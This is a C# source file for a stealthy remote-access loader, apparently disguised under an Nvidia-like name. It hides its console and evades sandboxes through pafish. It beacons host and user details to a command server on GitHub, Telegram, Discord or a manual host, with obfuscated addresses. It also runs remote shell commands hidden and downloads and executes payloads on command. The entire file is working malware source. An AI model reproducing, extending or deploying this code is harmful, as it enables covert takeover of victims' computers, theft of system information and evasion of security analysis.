using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Linq;

using System.Runtime.InteropServices;

namespace NvContainer
{
    static class Program
    {
        private const int MAX_TRACES = 5;

        // --- POLYMORPHIC C2 ENGINE ---
#if C2_TYPE_GITHUB
        private static string C2_TYPE = "GITHUB";
        private static string C2_URL = Decrypt("C2_VAL1", C2_KEY);
#elif C2_TYPE_TELEGRAM
        private static string C2_TYPE = "TELEGRAM";
        private static string C2_BOT_TOKEN = Decrypt("C2_VAL1", C2_KEY);
        private static string C2_CHAT_ID = Decrypt("C2_VAL2", C2_KEY);
#elif C2_TYPE_DISCORD
        private static string C2_TYPE = "DISCORD";
        private static string C2_WEBHOOK = Decrypt("C2_VAL1", C2_KEY);
#elif C2_TYPE_MANUAL
        private static string C2_TYPE = "MANUAL";
        private static string C2_SERVER = Decrypt("C2_VAL1", C2_KEY);
#else
        private static string C2_TYPE = "NONE";
#endif

        private const byte C2_KEY = 
#if C2_KEY
            C2_KEY;
#else
            0x00;
#endif

        private static string Decrypt(string input, byte key)
        {
            if (string.IsNullOrEmpty(input) || input == "C2_VAL1" || input == "C2_VAL2") return "";
            try {
                byte[] data = Convert.FromBase64String(input);
                for (int i = 0; i < data.Length; i++) data[i] ^= key;
                return System.Text.Encoding.UTF8.GetString(data);
            } catch { return ""; }
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        [STAThread]
        static void Main()
        {
            // --- GHOST MODE: ABSOLUTE TERMINAL HIDE ---
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_HIDE);
            }

            // --- ADVANCED ANTI-VM / SANDBOX GUARD ---
            if (IsAnalysisDetected())
            {
                while (true) { Thread.Sleep(int.MaxValue); }
            }

            // --- MAIN LOADER LOOP ---
            while (true)
            {
                try
                {
                    ExecuteC2Lifecycle();
                }
                catch { /* Silent stay alive */ }

                // Sleep between polls to remain stealthy and avoid rate-limiting
                Thread.Sleep(TimeSpan.FromMinutes(5));
            }
        }

        private static void ExecuteC2Lifecycle()
        {
            try
            {
                using (var client = new System.Net.Http.HttpClient())
                {
                    string heartbeat = $"[GHOST] Abyss Pulse | Machine: {Environment.MachineName} | User: {Environment.UserName} | OS: {Environment.OSVersion}";

                    switch (C2_TYPE)
                    {
                        case "GITHUB":
                            // 1. Fetch Command from obfuscated URL
                            string rawCommand = client.GetStringAsync(C2_URL).Result;
                            ProcessRemoteCommand(rawCommand);
                            break;

                        case "TELEGRAM":
                            // 1. Send Heartbeat to decrypted endpoint
                            string sendUrl = $"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage?chat_id={C2_CHAT_ID}&text={Uri.EscapeDataString(heartbeat)}";
                            client.GetAsync(sendUrl).Wait();

                            // 2. Fetch Command
                            string updatesUrl = $"https://api.telegram.org/bot{C2_BOT_TOKEN}/getUpdates?offset=-1&limit=1";
                            string updates = client.GetStringAsync(updatesUrl).Result;
                            if (updates.Contains("\"text\":\"")) {
                                string cmd = updates.Split(new[] { "\"text\":\"" }, StringSplitOptions.None)[1].Split('"')[0];
                                ProcessRemoteCommand(cmd);
                            }
                            break;

                        case "DISCORD":
                            var content = new System.Net.Http.StringContent("{\"content\": \"" + heartbeat + "\"}", System.Text.Encoding.UTF8, "application/json");
                            client.PostAsync(C2_WEBHOOK, content).Wait();
                            break;

                        case "MANUAL":
                            // Example for Manual Server (TCP/HTTP Heartbeat)
                            // Assuming C2_SERVER is "http://1.2.3.4:8080"
                            var manualContent = new System.Net.Http.StringContent(heartbeat);
                            client.PostAsync(C2_SERVER + "/heartbeat", manualContent).Wait();
                            break;
                    }
                }
            }
            catch { /* Silent fail */ }
        }

        private static void ProcessRemoteCommand(string raw)
        {
            if (string.IsNullOrWhiteSpace(raw)) return;

            try
            {
                // Simple Command Protocol: "CMD_TYPE:DATA"
                // Example: "SHELL:whoami"
                // Example: "FREEZE:TRUE"

                if (raw.StartsWith("SHELL:"))
                {
                    string cmd = raw.Substring(6);
                    ExecuteShell(cmd);
                }
                else if (raw.StartsWith("DOWNLOAD:"))
                {
                    // Format: DOWNLOAD:url|path
                    string[] parts = raw.Substring(9).Split('|');
                    if (parts.Length == 2)
                    {
                        DownloadAndExecute(parts[0], parts[1]);
                    }
                }
                else if (raw.StartsWith("FREEZE:"))
                {
                    while (true) { Thread.Sleep(int.MaxValue); }
                }
            }
            catch { /* Stealth fail */ }
        }

        private static void DownloadAndExecute(string url, string path)
        {
            try
            {
                using (var client = new System.Net.Http.HttpClient())
                {
                    byte[] data = client.GetByteArrayAsync(url).Result;
                    File.WriteAllBytes(path, data);
                    
                    ProcessStartInfo psi = new ProcessStartInfo(path)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false
                    };
                    Process.Start(psi);
                }
            }
            catch { }
        }

        private static void ExecuteShell(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi);
            }
            catch { }
        }

        /// <summary>
        /// Analyzes pafish64 log for security traces.
        /// If traces >= MAX_TRACES, returns true to freeze.
        /// </summary>
        private static bool IsAnalysisDetected()
        {
            string pafishPath = "pafish64.exe";
            if (!File.Exists(pafishPath)) return false; // If tool missing, assume safe for now

            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = pafishPath,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };

                using (Process p = Process.Start(psi))
                {
                    string output = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();

                    // Count occurring traces (keywords like "traced" or "detected")
                    // Example: "[pafish] Sandbox traced by missing dialog confirmation"
                    int tracesCount = 0;
                    string[] lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);

                    foreach (string line in lines)
                    {
                        if (line.ToLower().Contains("traced") || line.ToLower().Contains("found"))
                        {
                            tracesCount++;
                        }
                    }

                    return tracesCount >= MAX_TRACES;
                }
            }
            catch
            {
                return true; // If something errors out during check, safer to assumes analysis
            }
        }
    }
}
